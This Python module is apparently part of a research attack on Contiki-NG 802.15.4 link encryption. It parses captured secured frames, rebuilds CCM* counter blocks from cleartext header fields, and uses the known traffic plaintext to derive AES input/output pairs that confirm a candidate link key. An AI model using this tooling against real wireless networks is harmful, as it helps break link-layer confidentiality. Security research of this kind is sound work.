"""802.15.4 frames as the listener sees them, and the CCM* blocks inside one.

Everything the attack needs out of a captured frame is in the clear. A secured
Contiki-NG data frame carries the source EUI-64, the security level and the
frame counter in its auxiliary security header, and those three fields are the
whole of the CCM* counter block:

    A_1 = 0x01 | src EUI-64 (reversed from wire order) | frame counter (BE)
          | security level | 0x0001

CTR mode then hands the attacker the AES OUTPUT for free, because the payload
is `plaintext XOR AES(K, A_1)` and the traffic generator's plaintext is known.
So every frame is a complete `(input, output)` pair for AES-128 under the link
key, which is what makes a candidate key settleable by one block rather than by
agreement between pair sets.

WHAT THIS DOES NOT HANDLE. `parse_802154` covers the frame formats this network
produces and returns None for anything else, deliberately, so a mis-parse shows
up as a dropped record rather than as a wrong nonce byte. The 2015 addressing
table has a row that is easy to get wrong - with BOTH addresses extended the
source PAN ID is never present, so PIC=0 means "destination PAN only" rather
than "both" - and getting it wrong puts the aux header two bytes late and reads
security level 0x00 off a frame that says 0x05.
"""
from __future__ import annotations

import io

import numpy as np

# The MAC-level traffic generator fills the payload with 0x40 + (i & 0x0f);
# see the generator in the coordinator's udp-server.c. A deployment's real
# payload would be 6LoWPAN headers instead, which are equally known to anyone
# who has read the RFC, but this is the pattern the captures were taken with.
PT = bytes((0x40 + (i & 0x0F)) for i in range(64))


def parse_802154(b):
    """(secured, frame counter, aux header offset), or None if not parseable."""
    if len(b) < 3:
        return None
    fcf = b[0] | (b[1] << 8)
    sec = (fcf >> 3) & 1
    pic = (fcf >> 6) & 1
    seq_sup = (fcf >> 8) & 1
    dst_mode = (fcf >> 10) & 3
    ver = (fcf >> 12) & 3
    src_mode = (fcf >> 14) & 3
    if not sec:
        return (0, None, None)

    off = 2 + (0 if seq_sup else 1)
    # 802.15.4-2015 Table 7-2. See the module docstring on the row that bites.
    if ver == 2:
        if dst_mode == 3 and src_mode == 3:
            dst_pan, src_pan = (0 if pic else 1), 0
        elif dst_mode and src_mode:
            dst_pan, src_pan = 1, (0 if pic else 1)
        elif dst_mode:
            dst_pan, src_pan = (0 if pic else 1), 0
        elif src_mode:
            dst_pan, src_pan = 0, (0 if pic else 1)
        else:
            dst_pan, src_pan = pic, 0
    else:
        dst_pan = 1 if dst_mode else 0
        src_pan = (1 if src_mode else 0) and not pic

    off += 2 * dst_pan
    off += {0: 0, 2: 2, 3: 8}.get(dst_mode, 0)
    off += 2 * src_pan
    off += {0: 0, 2: 2, 3: 8}.get(src_mode, 0)

    if off + 5 > len(b):
        return None
    fc = (b[off + 1] | (b[off + 2] << 8) | (b[off + 3] << 16)
          | (b[off + 4] << 24))
    return (1, fc, off)


def layout(mpdu):
    """Where the fields are in a secured frame of this shape.

    Returns a dict of MPDU byte offsets: the aux security header, the source
    EUI-64 and the ciphertext. The listener prints a fixed number of MPDU bytes
    per record, so fixing these once from a parse and then slicing every record
    is both faster and checkable - `make_vector` asserts that the parse and the
    slicing agree before it packs anything.

    The source address has to be the EXTENDED one, because that is what goes
    into the CCM* nonce. A frame addressed short carries no EUI-64 to read, so
    this returns None rather than slicing eight bytes of whatever precedes the
    header.
    """
    pr = parse_802154(mpdu)
    if not pr or pr[2] is None:
        return None
    aux = pr[2]
    src_mode = (mpdu[1] >> 6) & 3
    if src_mode != 3:
        return None
    return {"aux": aux, "src_at": aux - 8, "ct": aux + 5,
            "frame_counter": pr[1]}


def counter_blocks(src_eui, sec_level, counters):
    """A_1 per frame. `counters` is an array of frame counters. -> (n,16) uint8."""
    rev = np.frombuffer(bytes(reversed(bytes(src_eui))), np.uint8)
    c = np.asarray(counters, np.int64)
    out = np.zeros((len(c), 16), np.uint8)
    out[:, 0] = 0x01
    out[:, 1:9] = rev
    for k in range(4):
        out[:, 9 + k] = (c >> (8 * (3 - k))) & 0xFF
    out[:, 13] = int(sec_level) & 7
    out[:, 15] = 0x01
    return out


def keystream_from_payload(payload):
    """AES output block from a captured ciphertext block. CTR mode, no key."""
    p = np.asarray(payload, np.uint8)
    return p ^ np.frombuffer(PT[:p.shape[-1]], np.uint8)


def verification_pairs(log_path, want=3):
    """(A_1, keystream) pairs read straight out of a capture log.

    These are real AES input/output pairs under the key being attacked and
    nothing in them is secret, which is what lets the search verify. Three of
    them is 384 bits, so at most one key satisfies all three.
    """
    out = []
    with io.open(log_path, encoding="ascii", errors="replace") as fh:
        for line in fh:
            f = line.split()
            if len(f) < 5 or f[0] != "S":
                continue
            try:
                b = bytes.fromhex(f[4])
            except ValueError:
                continue
            lay = layout(b)
            if not lay or len(b) < lay["ct"] + 16:
                continue
            src = b[lay["src_at"]:lay["src_at"] + 8]
            a1 = (b"\x01" + bytes(reversed(src))
                  + lay["frame_counter"].to_bytes(4, "big")
                  + bytes([b[lay["aux"]] & 7]) + b"\x00\x01")
            ks = bytes(x ^ y for x, y in zip(b[lay["ct"]:lay["ct"] + 16], PT))
            out.append((a1, ks))
            if len(out) >= want:
                break
    return out
